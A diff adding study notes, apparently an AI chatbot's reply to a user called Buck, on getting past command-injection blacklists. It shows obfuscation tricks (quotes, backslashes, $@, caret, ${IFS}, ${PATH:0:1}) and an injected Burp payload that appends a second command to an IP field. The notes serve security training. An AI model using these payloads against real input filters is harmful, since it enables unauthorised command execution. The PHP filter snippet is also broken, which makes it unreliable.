@@ -1,0 +1,90 @@
+🔍 Section Breakdown: Bypassing Blacklisted Commands
+🧠 The Problem:
+A WAF or backend filter says:
+
+“If I see whoami, cat, or any other banned command in this input, deny it.”
+
+They’re not filtering based on what’s executed, just what’s written.
+
+php
+Copy
+Edit
+$blacklist = ['whoami', 'cat'];
+if (strpos($_POST['input'], $word)) return "Invalid input";
+So if we can alter the command’s appearance (but keep it valid for the shell), it’ll bypass the filter and still run. That’s command obfuscation.
+
+🛠️ Basic Bypass Techniques (Manual Obfuscation)
+These work because Bash, CMD, and PowerShell interpret certain “noise” characters as ignorable, so the command still runs as if nothing changed.
+
+✅ Works on Linux + Windows:
+🔹 Quote Injection
+Add ' or " between letters — must be even number, and don’t mix quote types.
+
+bash
+Copy
+Edit
+w'h'o'am'i   # or   w"h"o"am"i
+✔️ Still runs whoami — filter doesn’t catch it because it's not literally whoami.
+
+🧪 Test in Burp:
+http
+Copy
+Edit
+127.0.0.1%0aw'h'o'am'i
+🐧 Linux-Only Techniques:
+🔸 Backslashes
+Bash uses backslashes \ to escape characters, but in the middle of a word, it just ignores them.
+
+bash
+Copy
+Edit
+w\ho\am\i
+🔸 Positional Parameter $@
+This one’s weird: $@ usually refers to all arguments passed to a script, but Bash lets you throw it in as junk without breaking a command.
+
+bash
+Copy
+Edit
+who$@ami
+🪟 Windows-Only Technique:
+🔹 Caret ^ character
+CMD ignores ^ inside a command string.
+
+cmd
+Copy
+Edit
+who^ami
+✔️ CMD executes whoami, filter says “never heard of it.”
+
+🧩 Patterns & Hints
+Goal	Bypass Techniques
+Bypass command blacklist	Quote injection (' or ")
+Linux: \, $@
+Windows: ^
+Command not running	Try other forms like: w'h'o'am'i, who$@ami
+Filtered but you’re unsure why	Try removing just the command and re-add each character one at a time
+🧠 “Got This, Do That” Workflow
+markdown
+Copy
+Edit
+### 🎯 Got This: Input blocked when I add a command like `whoami`
+#### ✅ Do That:
+- Try basic obfuscation:
+  - `w'h'o'am'i`
+  - `w"h"o"am"i`
+- Try Linux-only:
+  - `who$@ami`
+  - `w\ho\am\i`
+- Try Windows-only:
+  - `who^ami`
+- Combine with space bypass:
+  - `${IFS}`, `%09`, `{ls,-la}`
+- Combine with character bypass:
+  - `${PATH:0:1}` for `/`
+  - `${LS_COLORS:10:1}` for `;`
+- Rebuild in Burp:
+  - URL encode as needed
+🔥 Final Thoughts:
+You’re not just injecting commands — you’re dodging sensors, camouflaging input, and outsmarting static filters. That’s some real ninja-Red-Team energy 🥷
+
+Let’s keep forging steel, Buck. You want the next one?
